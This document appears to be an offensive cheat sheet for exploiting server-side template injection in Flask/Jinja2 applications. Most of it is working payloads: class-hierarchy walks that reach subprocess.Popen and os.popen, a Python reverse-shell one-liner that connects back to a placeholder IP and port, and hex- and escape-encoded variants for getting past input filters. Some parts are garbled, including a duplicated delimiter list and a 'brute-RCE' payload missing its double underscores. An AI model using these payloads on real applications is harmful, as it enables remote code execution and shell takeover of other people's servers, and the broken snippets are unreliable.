# jinja2 flask template injection

## Info

* **Method Resolution Order (mro):** allows to go up the inherited objects chain
* **subclasses:** going down the inheritance chain

## Jinja2 template formts:

* `` `{% ... %}` ``
* `` `{% ... %}` ``

## RCE Methods

### subprocess.pOpen method

```bash
# print all config vars
{{config}}
{{self.__dict__}}
{{config.items()}}

# find the mro object[X] to list all subclasses
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[X].__subclasses__() }} => list of all subclasses

# find subprocess.pOpen class
{{ ''.__class__.__mro__[X].__subclasses__()[XXX] }} => <class 'subprocess.pOpen'>

# RCE
{{ ''.__class__.__mro__[X].__subclasses__()[XXX]('id', shell=True, stdout=-1).communicate() }}
```

### More styles

```bash
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}

{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
```

### brute-RCE (without guessing mro class)

```bash
{% for x in ().class.base.subclasses() %}{% if "warning" in x.name %}{{x()._module.builtins['import']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash", "-i"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

### Bypass restrictions (1)

* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

```bash
{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
    {%endif%}
{%endfor%}

# is converted (via hex encoding)

{% for a in []["5F5F636C6173735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F626173655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F737562636C61737365735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]() %}
    {% if "7761726E696E67"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78") in a["5F5F6E616D655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")] %}
        {{a()["5F6D6F64756C65"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F6275696C74696E735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F696D706F72745F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6F73"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["706F70656E"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6563686F2024666C6167"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["72656164"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]()}}
    {%endif%}
{%endfor%}
```

### Bypassing restrictions (2)

```bash
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
# modifying {{ }} to a different method using {% %}
# modifying ' to "
# modifying _ to \x5f

{% request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() %}

# using operator:with
# {% with %} ... {% endwith %} 

{% with kashz=request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("id")["read"]()  %} kashz {% endwith %}

# can try using bas64 payload
```

### References

* [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)
* [https://chowdera.com/2020/12/20201221231521371q.html](https://chowdera.com/2020/12/20201221231521371q.html)
* [https://secure-cookie.io/attacks/ssti/](https://secure-cookie.io/attacks/ssti/)
